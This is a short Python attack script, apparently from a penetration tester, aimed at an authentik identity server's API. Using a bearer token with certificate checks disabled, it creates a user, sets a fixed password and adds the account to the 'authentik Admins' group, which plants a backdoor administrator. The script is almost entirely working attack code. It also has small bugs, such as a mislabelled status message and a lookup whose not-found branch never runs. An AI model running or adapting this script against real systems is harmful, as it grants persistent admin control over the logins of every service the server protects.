#!/usr/bin/env python
# Author - luks (@luksecurity_)

import requests
import json

URL = "<URL>"
API_TOKEN = "***"
HEADERS = {
    "Authorization": f"Bearer {API_TOKEN}",
    "Accept": "application/json",
    "Content-Type": "application/json"
}

def create_user(username, name):
    print("\n[+] Creating user")
    data = {"username": username, "name": name}
    try:
        response = requests.post(f"{URL}/core/users/", headers=HEADERS, json=data, verify=False)
        response.raise_for_status()
        print(f"User created successfully!:\n{json.dumps(response.json(), indent=4)}")
        return response.json().get("pk")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None

def set_user_password(user_id, password):
    print("\n[+] Setting user password")
    data = {"password": password}
    try:
        response = requests.post(f"{URL}/core/users/{user_id}/set_password/", headers=HEADERS, json=data, verify=False)
        response.raise_for_status()
        print("Password set successfully!")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

def get_groups():
    print("\n[+] Setting user password")
    try:
        response = requests.get(f"{URL}/core/groups/", headers=HEADERS, verify=False)
        response.raise_for_status()
        groups = response.json()
        print("Available groups:")
        print(json.dumps(groups, indent=4))
        return groups
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return {"results": []}

def add_user_to_group(user_id, group_id):
    print("\n[+] Adding user to admin group")
    data = {"pk": str(user_id)}
    try:
        response = requests.post(f"{URL}/core/groups/{group_id}/add_user/", headers=HEADERS, json=data, verify=False)
        response.raise_for_status()
        print("User added to group successfully!")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

def main():
    user_id = create_user("luks", "luks")
    if user_id:
        set_user_password(user_id, "Pentest123!")
        groups = get_groups()
        admin_group_id = next(group['pk'] for group in groups['results'] if group['name'] == "authentik Admins")
        if admin_group_id:
            add_user_to_group(user_id, admin_group_id)
        else:
            print("Admin group not found!")

if __name__ == "__main__":
    main()
